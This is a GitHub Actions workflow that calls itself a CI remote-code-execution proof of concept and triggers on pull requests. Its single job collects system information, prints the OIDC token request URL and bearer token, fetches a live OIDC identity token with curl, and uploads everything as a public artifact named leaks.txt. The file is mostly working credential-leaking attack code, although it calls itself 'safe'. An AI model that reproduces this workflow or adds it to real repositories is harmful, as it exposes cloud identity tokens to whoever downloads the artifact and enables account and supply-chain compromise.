name: CI RCE PoC with OIDC Leak

on:
  pull_request:
    branches:
      - main
    types: [opened, synchronize]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    name: Safe RCE & OIDC Leak
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Execute payload and extract info
        run: |
          echo "SAFE_CI_PROOF [+] Executing payload..." > leaks.txt

          echo "== WHOAMI ==" >> leaks.txt
          whoami >> leaks.txt

          echo "== ID ==" >> leaks.txt
          id >> leaks.txt

          echo "== UNAME ==" >> leaks.txt
          uname -a >> leaks.txt

          echo "== OS RELEASE ==" >> leaks.txt
          cat /etc/os-release >> leaks.txt

          echo "== ENV VARS (SAFE) ==" >> leaks.txt
          env | grep -E '^(HOME|LANG|USER|PATH)' >> leaks.txt

          echo "== OIDC ENV ==" >> leaks.txt
          echo "ACTIONS_ID_TOKEN_REQUEST_URL=$ACTIONS_ID_TOKEN_REQUEST_URL" >> leaks.txt
          echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN=$ACTIONS_ID_TOKEN_REQUEST_TOKEN" >> leaks.txt

          echo "== OIDC TOKEN FETCH ==" >> leaks.txt
          curl -sSL -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL?audience=api://default" >> leaks.txt || echo "OIDC fetch failed" >> leaks.txt

      - name: Upload PoC Leak Artifact
        uses: actions/upload-artifact@v4
        with:
          name: leaks.txt
          path: leaks.txt
